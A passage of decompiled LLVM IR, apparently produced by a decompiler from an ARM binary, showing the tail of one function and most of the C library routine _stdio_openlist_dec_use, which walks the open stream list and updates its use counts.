  %v1_16304 = phi i32 [ %v0_16300, %dec_label_pc_16300 ], [ %v3_162d4, %dec_label_pc_162d4 ], [ %v1_162e4.pre, %dec_label_pc_162ec.dec_label_pc_162e0_crit_edge ]
  %v3_16304 = icmp uge i32 %v0_1630c, %v1_16304
  store i1 %v3_16304, i1* %cpsr_c.global-to-local, align 1
  %v9_16304 = icmp eq i32 %v0_1630c, %v1_16304
  br i1 %v9_16304, label %dec_label_pc_1630c, label %dec_label_pc_16304.dec_label_pc_162d4_crit_edge

dec_label_pc_16304.dec_label_pc_162d4_crit_edge:  ; preds = %dec_label_pc_16304
  %v0_162d4.pre = load i32, i32* @r7, align 4
  %v0_162dc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_162d4

dec_label_pc_1630c:                               ; preds = %dec_label_pc_16304
  %v2_1630c = icmp ne i32 %v1_16304, 0
  store i1 %v2_1630c, i1* %cpsr_c.global-to-local, align 1
  %v7_16310 = icmp slt i32 %v1_16304, 2
  br i1 %v7_16310, label %dec_label_pc_1632c, label %dec_label_pc_16314

dec_label_pc_16314:                               ; preds = %dec_label_pc_1630c
  %v0_16318 = load i32, i32* %r1.global-to-local, align 4
  %v1_16318 = add i32 %v0_16318, 129
  store i32 %v1_16318, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1632c

dec_label_pc_1632c:                               ; preds = %dec_label_pc_162b8, %dec_label_pc_1629c, %dec_label_pc_16314, %dec_label_pc_1630c
  %v0_1632c = load i32, i32* %r8.global-to-local, align 4
  %v2_16330 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16330, i32* %r4.global-to-local, align 4
  store i32 %v6_1621c, i32* @r5, align 4
  store i32 %v9_1621c, i32* @r6, align 4
  store i32 %v12_1621c, i32* @r7, align 4
  store i32 %v15_1621c, i32* @r8, align 4
  store i32 %v24_1621c, i32* @lr, align 4
  ret i32 %v0_1632c

; uselistorder directives
  uselistorder i32 %v0_16300, { 1, 0, 2 }
  uselistorder i32 %v1_162e4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_162a0, { 1, 0 }
  uselistorder i32 %v0_162a4, { 1, 0 }
  uselistorder i32 %v1_16260.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 12, 5, 6, 7, 8, 10, 9, 0, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 11, 12, 4, 5, 6, 8, 7, 0, 9, 10 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2, 5 }
  uselistorder label %dec_label_pc_1632c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16304, { 2, 1, 0 }
  uselistorder label %dec_label_pc_162ec, { 1, 0 }
  uselistorder label %dec_label_pc_1629c, { 1, 0 }
  uselistorder label %dec_label_pc_16290, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_16280, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16268, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16338 = load i32, i32* @r4, align 4
  store i32 %v3_16338, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r5.global-to-local, align 4
  %v4_16348 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 160) to i32*), align 4
  store i32 %v4_16348, i32* %r7.global-to-local, align 4
  %v0_1634c = call i32 @__aeabi_read_tp()
  store i32 %v0_1634c, i32* %r0.global-to-local, align 4
  %v1_16350 = add i32 %v4_16348, 8
  %v2_16350 = inttoptr i32 %v1_16350 to i32*
  %v3_16350 = load i32, i32* %v2_16350, align 4
  store i32 %v3_16350, i32* %r3.global-to-local, align 4
  %v1_16354 = add i32 %v0_1634c, -1168
  store i32 %v1_16354, i32* %r6.global-to-local, align 4
  %v3_16358 = icmp uge i32 %v3_16350, %v1_16354
  store i1 %v3_16358, i1* %cpsr_c.global-to-local, align 1
  %v9_16358 = icmp eq i32 %v3_16350, %v1_16354
  br i1 %v9_16358, label %dec_label_pc_163a4, label %dec_label_pc_16364

dec_label_pc_16364:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16348, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1637093 = inttoptr i32 %v4_16348 to i32*
  %v2_1637094 = load i32, i32* %v1_1637093, align 4
  store i32 %v2_1637094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1637496 = icmp eq i32 %v2_1637094, 0
  br i1 %v9_1637496, label %dec_label_pc_1637c, label %dec_label_pc_16394

dec_label_pc_1637c:                               ; preds = %dec_label_pc_16364, %dec_label_pc_1637c.dec_label_pc_16370_crit_edge
  %v0_1637c97 = phi i32 [ %v1_16374.pre, %dec_label_pc_1637c.dec_label_pc_16370_crit_edge ], [ 0, %dec_label_pc_16364 ]
  store i32 %v0_1637c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1638c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1638c, label %dec_label_pc_16390, label %dec_label_pc_1637c.dec_label_pc_16370_crit_edge

dec_label_pc_1637c.dec_label_pc_16370_crit_edge:  ; preds = %dec_label_pc_1637c
  %v0_16370.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16374.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16370 = inttoptr i32 %v0_16370.pre to i32*
  %v2_16370 = load i32, i32* %v1_16370, align 4
  store i32 %v2_16370, i32* %r3.global-to-local, align 4
  %v3_16374 = icmp uge i32 %v2_16370, %v1_16374.pre
  store i1 %v3_16374, i1* %cpsr_c.global-to-local, align 1
  %v9_16374 = icmp eq i32 %v2_16370, %v1_16374.pre
  br i1 %v9_16374, label %dec_label_pc_1637c, label %dec_label_pc_16394

dec_label_pc_16390:                               ; preds = %dec_label_pc_1637c
  %v0_16390 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16390, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16394

dec_label_pc_16394:                               ; preds = %dec_label_pc_16364, %dec_label_pc_1637c.dec_label_pc_16370_crit_edge, %dec_label_pc_16390
  %v0_16394 = phi i32 [ %v0_16390, %dec_label_pc_16390 ], [ %v2_1637094, %dec_label_pc_16364 ], [ %v2_16370, %dec_label_pc_1637c.dec_label_pc_16370_crit_edge ]
  %v1_16394 = phi i32 [ %v0_16390, %dec_label_pc_16390 ], [ 0, %dec_label_pc_16364 ], [ %v1_16374.pre, %dec_label_pc_1637c.dec_label_pc_16370_crit_edge ]
  %v3_16394 = icmp uge i32 %v0_16394, %v1_16394
  store i1 %v3_16394, i1* %cpsr_c.global-to-local, align 1
  %v9_16394 = icmp eq i32 %v0_16394, %v1_16394
  br i1 %v9_16394, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_16394
  %v1_16398 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16398, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_16394, %bb
  %v1_1639c = xor i1 %v9_16394, true
  call void @__pseudo_cond_branch(i1 %v1_1639c, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_163a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_163a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_163a0 = add i32 %v1_163a0, 8
  %v3_163a0 = inttoptr i32 %v2_163a0 to i32*
  store i32 %v0_163a0, i32* %v3_163a0, align 4
  br label %dec_label_pc_163a4

dec_label_pc_163a4:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_163a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_163a8 = add i32 %v0_163a8, 160
  %v3_163a8 = inttoptr i32 %v2_163a8 to i32*
  %v4_163a8 = load i32, i32* %v3_163a8, align 4
  store i32 %v4_163a8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_163b0 = add i32 %v0_163a8, 12
  %v3_163b0 = inttoptr i32 %v2_163b0 to i32*
  %v4_163b0 = load i32, i32* %v3_163b0, align 4
  store i32 %v4_163b0, i32* %r3.global-to-local, align 4
  %v1_163b4 = inttoptr i32 %v4_163b0 to i32*
  %v2_163b4 = load i32, i32* %v1_163b4, align 4
  store i32 %v2_163b4, i32* %r1.global-to-local, align 4
  %v1_163b8 = add i32 %v4_163a8, 4
  %v2_163b8 = inttoptr i32 %v1_163b8 to i32*
  %v3_163b8 = load i32, i32* %v2_163b8, align 4
  %v2_163bc = icmp ne i32 %v2_163b4, 0
  store i1 %v2_163bc, i1* %cpsr_c.global-to-local, align 1
  %v7_163bc = icmp eq i32 %v2_163b4, 1
  %v1_163c0 = add i32 %v3_163b8, 1
  store i32 %v1_163c0, i32* %r3.global-to-local, align 4
  store i32 %v1_163c0, i32* %v2_163b8, align 4
  br i1 %v7_163bc, label %dec_label_pc_163cc, label %dec_label_pc_16530

dec_label_pc_163cc:                               ; preds = %dec_label_pc_163a4
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_163d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_163d0 = add i32 %v0_163d0, 80
  %v3_163d0 = inttoptr i32 %v2_163d0 to i32*
  %v4_163d0 = load i32, i32* %v3_163d0, align 4
  store i32 %v4_163d0, i32* %r3.global-to-local, align 4
  %v1_163d4 = inttoptr i32 %v4_163d0 to i32*
  %v2_163d4 = load i32, i32* %v1_163d4, align 4
  store i32 %v2_163d4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_163d4, 1
  br i1 %tmp46, label %dec_label_pc_16530, label %dec_label_pc_163e0

dec_label_pc_163e0:                               ; preds = %dec_label_pc_163cc
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_163e4 = add i32 %v0_163d0, 152
  %v3_163e4 = inttoptr i32 %v2_163e4 to i32*
  %v4_163e4 = load i32, i32* %v3_163e4, align 4
  store i32 %v4_163e4, i32* %r7.global-to-local, align 4
  %v1_163e8 = add i32 %v4_163e4, 8
  %v2_163e8 = inttoptr i32 %v1_163e8 to i32*
  %v3_163e8 = load i32, i32* %v2_163e8, align 4
  store i32 %v3_163e8, i32* %r3.global-to-local, align 4
  %v1_163ec = load i32, i32* %r6.global-to-local, align 4
  %v3_163ec = icmp uge i32 %v3_163e8, %v1_163ec
  store i1 %v3_163ec, i1* %cpsr_c.global-to-local, align 1
  %v9_163ec = icmp eq i32 %v3_163e8, %v1_163ec
  br i1 %v9_163ec, label %dec_label_pc_16430, label %dec_label_pc_163f4

dec_label_pc_163f4:                               ; preds = %dec_label_pc_163e0
  store i32 %v4_163e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_163fc86 = inttoptr i32 %v4_163e4 to i32*
  %v2_163fc87 = load i32, i32* %v1_163fc86, align 4
  store i32 %v2_163fc87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1640089 = icmp eq i32 %v2_163fc87, 0
  br i1 %v9_1640089, label %dec_label_pc_16408, label %dec_label_pc_16420

dec_label_pc_16408:                               ; preds = %dec_label_pc_163f4, %dec_label_pc_16408.dec_label_pc_163fc_crit_edge
  %v0_1640890 = phi i32 [ %v1_16400.pre, %dec_label_pc_16408.dec_label_pc_163fc_crit_edge ], [ 0, %dec_label_pc_163f4 ]
  store i32 %v0_1640890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16418 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16418, label %dec_label_pc_1641c, label %dec_label_pc_16408.dec_label_pc_163fc_crit_edge

dec_label_pc_16408.dec_label_pc_163fc_crit_edge:  ; preds = %dec_label_pc_16408
  %v0_163fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16400.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_163fc = inttoptr i32 %v0_163fc.pre to i32*
  %v2_163fc = load i32, i32* %v1_163fc, align 4
  store i32 %v2_163fc, i32* %r3.global-to-local, align 4
  %v3_16400 = icmp uge i32 %v2_163fc, %v1_16400.pre
  store i1 %v3_16400, i1* %cpsr_c.global-to-local, align 1
  %v9_16400 = icmp eq i32 %v2_163fc, %v1_16400.pre
  br i1 %v9_16400, label %dec_label_pc_16408, label %dec_label_pc_16420

dec_label_pc_1641c:                               ; preds = %dec_label_pc_16408
  %v0_1641c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1641c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16420

dec_label_pc_16420:                               ; preds = %dec_label_pc_163f4, %dec_label_pc_16408.dec_label_pc_163fc_crit_edge, %dec_label_pc_1641c
  %v0_16420 = phi i32 [ %v0_1641c, %dec_label_pc_1641c ], [ %v2_163fc87, %dec_label_pc_163f4 ], [ %v2_163fc, %dec_label_pc_16408.dec_label_pc_163fc_crit_edge ]
  %v1_16420 = phi i32 [ %v0_1641c, %dec_label_pc_1641c ], [ 0, %dec_label_pc_163f4 ], [ %v1_16400.pre, %dec_label_pc_16408.dec_label_pc_163fc_crit_edge ]
  %v3_16420 = icmp uge i32 %v0_16420, %v1_16420
  store i1 %v3_16420, i1* %cpsr_c.global-to-local, align 1
  %v9_16420 = icmp eq i32 %v0_16420, %v1_16420
  br i1 %v9_16420, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_16420
  %v1_16424 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16424, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_16420, %bb47
  %v1_16428 = xor i1 %v9_16420, true
  call void @__pseudo_cond_branch(i1 %v1_16428, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_1642c = load i32, i32* %r6.global-to-local, align 4
  %v1_1642c = load i32, i32* %r7.global-to-local, align 4
  %v2_1642c = add i32 %v1_1642c, 8
  %v3_1642c = inttoptr i32 %v2_1642c to i32*
  store i32 %v0_1642c, i32* %v3_1642c, align 4
  %v0_16438.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16430

dec_label_pc_16430:                               ; preds = %dec_label_pc_163e0, %bb48
  %v0_16438 = phi i32 [ %v0_163d0, %dec_label_pc_163e0 ], [ %v0_16438.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_16438 = add i32 %v0_16438, 152
  %v3_16438 = inttoptr i32 %v2_16438 to i32*
  %v4_16438 = load i32, i32* %v3_16438, align 4
  store i32 %v4_16438, i32* %r0.global-to-local, align 4
  %v2_1643c = add i32 %v0_16438, 76
  %v3_1643c = inttoptr i32 %v2_1643c to i32*
  %v4_1643c = load i32, i32* %v3_1643c, align 4
  store i32 %v4_1643c, i32* %r2.global-to-local, align 4
  %v1_16440 = add i32 %v4_16438, 4
  %v2_16440 = inttoptr i32 %v1_16440 to i32*
  %v3_16440 = load i32, i32* %v2_16440, align 4
  store i32 %v3_16440, i32* %r3.global-to-local, align 4
  %v1_16444 = inttoptr i32 %v4_1643c to i32*
  %v2_16444 = load i32, i32* %v1_16444, align 4
  store i32 %v2_16444, i32* %r2.global-to-local, align 4
  %v1_16448 = add i32 %v3_16440, 1
  store i32 %v1_16448, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_16448, i32* %v2_16440, align 4
  %v0_16498.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1649811 = icmp eq i32 %v0_16498.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1649811, label %dec_label_pc_164a4, label %dec_label_pc_1645c

dec_label_pc_1645c:                               ; preds = %dec_label_pc_16430, %dec_label_pc_16494
  %v0_164802 = phi i32 [ %v0_16494, %dec_label_pc_16494 ], [ %v0_16498.pr, %dec_label_pc_16430 ]
  %v1_1645c = inttoptr i32 %v0_164802 to i16*
  %v2_1645c = load i16, i16* %v1_1645c, align 2
  %v3_1645c = zext i16 %v2_1645c to i32
  store i32 %v3_1645c, i32* %r3.global-to-local, align 4
  %v2_16460 = and i32 %v3_1645c, 32816
  store i32 %v2_16460, i32* %r1.global-to-local, align 4
  %v2_16464 = icmp ugt i32 %v2_16460, 47
  store i1 %v2_16464, i1* %cpsr_c.global-to-local, align 1
  %v7_16464 = icmp eq i32 %v2_16460, 48
  %v1_16468 = add i32 %v0_164802, 32
  %v2_16468 = inttoptr i32 %v1_16468 to i32*
  %v3_16468 = load i32, i32* %v2_16468, align 4
  store i32 %v3_16468, i32* %r4.global-to-local, align 4
  br i1 %v7_16464, label %dec_label_pc_16474, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1645c
  store i32 %v0_164802, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16494

dec_label_pc_16474:                               ; preds = %dec_label_pc_1645c
  %v0_16474 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16474 = icmp eq i32 %v0_16474, 0
  br i1 %v2_16474, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_16474
  %v1_16478 = load i32, i32* %r5.global-to-local, align 4
  %v2_16478 = load i32, i32* %r7.global-to-local, align 4
  %v3_16478 = add i32 %v2_16478, %v1_16478
  %v4_16478 = inttoptr i32 %v3_16478 to i32*
  %v5_16478 = load i32, i32* %v4_16478, align 4
  store i32 %v5_16478, i32* %r3.global-to-local, align 4
  %v3_1647c = inttoptr i32 %v5_16478 to i32*
  store i32 %v3_16468, i32* %v3_1647c, align 4
  %v0_16480 = load i32, i32* %r2.global-to-local, align 4
  %v1_16480 = inttoptr i32 %v0_16480 to i16*
  %v2_16480 = load i16, i16* %v1_16480, align 2
  %v3_16480 = zext i16 %v2_16480 to i32
  store i32 %v3_16480, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_16474
  %v2_164808 = load i16, i16* %v1_1645c, align 2
  %v3_164809 = zext i16 %v2_164808 to i32
  store i32 %v3_164809, i32* %r3.global-to-local, align 4
  %v3_16484 = add i32 %v0_16474, 32
  %v4_16484 = inttoptr i32 %v3_16484 to i32*
  store i32 %v3_16468, i32* %v4_16484, align 4
  %v0_16488.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_16488 = phi i32 [ %v3_16480, %.thread ], [ %v0_16488.pre, %bb49 ]
  %v1_16488 = and i32 %v0_16488, 8192
  %v2_16488 = icmp eq i32 %v1_16488, 0
  br i1 %v2_16488, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1648c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1648c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_16490 = xor i1 %v2_16488, true
  call void @__pseudo_cond_branch(i1 %v1_16490, i32 ptrtoint (i32* @global_var_12d8c.33 to i32))
  %v0_16494.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16494

dec_label_pc_16494:                               ; preds = %.thread38, %bb52
  %v0_16494 = phi i32 [ %v0_16494.pre, %bb52 ], [ %v3_16468, %.thread38 ]
  store i32 %v0_16494, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16498 = icmp eq i32 %v0_16494, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16498, label %dec_label_pc_164a4, label %dec_label_pc_1645c

dec_label_pc_164a4:                               ; preds = %dec_label_pc_16494, %dec_label_pc_16430
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_164a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_164a8 = add i32 %v0_164a8, 152
  %v3_164a8 = inttoptr i32 %v2_164a8 to i32*
  %v4_164a8 = load i32, i32* %v3_164a8, align 4
  store i32 %v4_164a8, i32* %r0.global-to-local, align 4
  %v1_164ac = add i32 %v4_164a8, 4
  %v2_164ac = inttoptr i32 %v1_164ac to i32*
  %v3_164ac = load i32, i32* %v2_164ac, align 4
  %v1_164b0 = add i32 %v3_164ac, -1
  store i32 %v1_164b0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_164b4 = icmp eq i32 %v1_164b0, 0
  store i32 %v1_164b0, i32* %v2_164ac, align 4
  br i1 %v2_164b4, label %dec_label_pc_164c0, label %dec_label_pc_16520

dec_label_pc_164c0:                               ; preds = %dec_label_pc_164a4
  %v0_164c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_164c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_164c0 = add i32 %v1_164c0, 8
  %v3_164c0 = inttoptr i32 %v2_164c0 to i32*
  store i32 %v0_164c0, i32* %v3_164c0, align 4
  %v0_164c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_164c4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %dec_label_pc_164f8.dec_label_pc_164c8_crit_edge, %dec_label_pc_164c0
  %v0_164c8 = phi i32 [ %v0_164c8.pre, %dec_label_pc_164f8.dec_label_pc_164c8_crit_edge ], [ %v0_164c4, %dec_label_pc_164c0 ]
  %v1_164c8 = inttoptr i32 %v0_164c8 to i32*
  %v2_164c8 = load i32, i32* %v1_164c8, align 4
  store i32 %v2_164c8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_164c8, i32* %r2.global-to-local, align 4
  %v2_164d474 = load i32, i32* %v1_164c8, align 4
  store i32 %v2_164d474, i32* %r3.global-to-local, align 4
  %v3_164d876 = icmp uge i32 %v2_164d474, %v2_164c8
  store i1 %v3_164d876, i1* %cpsr_c.global-to-local, align 1
  %v9_164d882 = icmp eq i32 %v2_164d474, %v2_164c8
  br i1 %v9_164d882, label %dec_label_pc_164e0, label %dec_label_pc_164f8

dec_label_pc_164e0:                               ; preds = %dec_label_pc_164c8, %dec_label_pc_164e0.dec_label_pc_164d4_crit_edge
  %v0_164e083 = phi i32 [ %v1_164d8.pre, %dec_label_pc_164e0.dec_label_pc_164d4_crit_edge ], [ %v2_164c8, %dec_label_pc_164c8 ]
  store i32 %v0_164e083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_164f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_164f0, label %dec_label_pc_164f4, label %dec_label_pc_164e0.dec_label_pc_164d4_crit_edge

dec_label_pc_164e0.dec_label_pc_164d4_crit_edge:  ; preds = %dec_label_pc_164e0
  %v0_164d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_164d8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_164d4 = inttoptr i32 %v0_164d4.pre to i32*
  %v2_164d4 = load i32, i32* %v1_164d4, align 4
  store i32 %v2_164d4, i32* %r3.global-to-local, align 4
  %v3_164d8 = icmp uge i32 %v2_164d4, %v1_164d8.pre
  store i1 %v3_164d8, i1* %cpsr_c.global-to-local, align 1
  %v9_164d8 = icmp eq i32 %v2_164d4, %v1_164d8.pre
  br i1 %v9_164d8, label %dec_label_pc_164e0, label %dec_label_pc_164f8

dec_label_pc_164f4:                               ; preds = %dec_label_pc_164e0
  %v0_164f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_164f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_164f8

dec_label_pc_164f8:                               ; preds = %dec_label_pc_164c8, %dec_label_pc_164e0.dec_label_pc_164d4_crit_edge, %dec_label_pc_164f4
  %v0_16500 = phi i32 [ %v0_164f4, %dec_label_pc_164f4 ], [ %v2_164d474, %dec_label_pc_164c8 ], [ %v2_164d4, %dec_label_pc_164e0.dec_label_pc_164d4_crit_edge ]
  %v1_164f8 = phi i32 [ %v0_164f4, %dec_label_pc_164f4 ], [ %v2_164c8, %dec_label_pc_164c8 ], [ %v1_164d8.pre, %dec_label_pc_164e0.dec_label_pc_164d4_crit_edge ]
  %v3_164f8 = icmp uge i32 %v0_16500, %v1_164f8
  store i1 %v3_164f8, i1* %cpsr_c.global-to-local, align 1
  %v9_164f8 = icmp eq i32 %v0_16500, %v1_164f8
  br i1 %v9_164f8, label %dec_label_pc_16500, label %dec_label_pc_164f8.dec_label_pc_164c8_crit_edge

dec_label_pc_164f8.dec_label_pc_164c8_crit_edge:  ; preds = %dec_label_pc_164f8
  %v0_164c8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_164c8

dec_label_pc_16500:                               ; preds = %dec_label_pc_164f8
  %v2_16500 = icmp ne i32 %v1_164f8, 0
  store i1 %v2_16500, i1* %cpsr_c.global-to-local, align 1
  %v7_16504 = icmp slt i32 %v1_164f8, 2
  br i1 %v7_16504, label %dec_label_pc_16520, label %dec_label_pc_16508

dec_label_pc_16508:                               ; preds = %dec_label_pc_16500
  %v0_16508 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16508, i32* %r0.global-to-local, align 4
  %v0_1650c = load i32, i32* %r1.global-to-local, align 4
  %v1_1650c = add i32 %v0_1650c, 129
  store i32 %v1_1650c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16520

dec_label_pc_16520:                               ; preds = %dec_label_pc_164a4, %dec_label_pc_16508, %dec_label_pc_16500
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16524 = load i32, i32* %r5.global-to-local, align 4
  %v2_16524 = add i32 %v0_16524, 80
  %v3_16524 = inttoptr i32 %v2_16524 to i32*
  %v4_16524 = load i32, i32* %v3_16524, align 4
  store i32 %v4_16524, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1652c = inttoptr i32 %v4_16524 to i32*
  store i32 0, i32* %v2_1652c, align 4
  br label %dec_label_pc_16530

dec_label_pc_16530:                               ; preds = %dec_label_pc_163a4, %dec_label_pc_163cc, %dec_label_pc_16520
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16534 = load i32, i32* %r5.global-to-local, align 4
  %v2_16534 = add i32 %v0_16534, 160
  %v3_16534 = inttoptr i32 %v2_16534 to i32*
  %v4_16534 = load i32, i32* %v3_16534, align 4
  store i32 %v4_16534, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1653c = add i32 %v0_16534, 12
  %v3_1653c = inttoptr i32 %v2_1653c to i32*
  %v4_1653c = load i32, i32* %v3_1653c, align 4
  store i32 %v4_1653c, i32* %r1.global-to-local, align 4
  %v1_16540 = add i32 %v4_16534, 4
  %v2_16540 = inttoptr i32 %v1_16540 to i32*
  %v3_16540 = load i32, i32* %v2_16540, align 4
  store i32 %v3_16540, i32* %r2.global-to-local, align 4
  %v1_16544 = inttoptr i32 %v4_1653c to i32*
  %v2_16544 = load i32, i32* %v1_16544, align 4
  %v1_16548 = add i32 %v3_16540, -1
  store i32 %v1_16548, i32* %r2.global-to-local, align 4
  %v1_1654c = add i32 %v2_16544, -1
  store i32 %v1_1654c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16550 = icmp eq i32 %v1_16548, 0
  store i32 %v1_1654c, i32* %v1_16544, align 4
  %v0_16558 = load i32, i32* %r2.global-to-local, align 4
  %v1_16558 = load i32, i32* %r0.global-to-local, align 4
  %v2_16558 = add i32 %v1_16558, 4
  %v3_16558 = inttoptr i32 %v2_16558 to i32*
  store i32 %v0_16558, i32* %v3_16558, align 4
  br i1 %v2_16550, label %dec_label_pc_16560, label %dec_label_pc_165c0

dec_label_pc_16560:                               ; preds = %dec_label_pc_16530
  %v0_16560 = load i32, i32* %r2.global-to-local, align 4
  %v1_16560 = load i32, i32* %r0.global-to-local, align 4
  %v2_16560 = add i32 %v1_16560, 8
  %v3_16560 = inttoptr i32 %v2_16560 to i32*
  store i32 %v0_16560, i32* %v3_16560, align 4
  %v0_16564 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16564, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16568

dec_label_pc_16568:                               ; preds = %dec_label_pc_16598.dec_label_pc_16568_crit_edge, %dec_label_pc_16560
  %v0_16568 = phi i32 [ %v0_16568.pre, %dec_label_pc_16598.dec_label_pc_16568_crit_edge ], [ %v0_16564, %dec_label_pc_16560 ]
  %v1_16568 = inttoptr i32 %v0_16568 to i32*
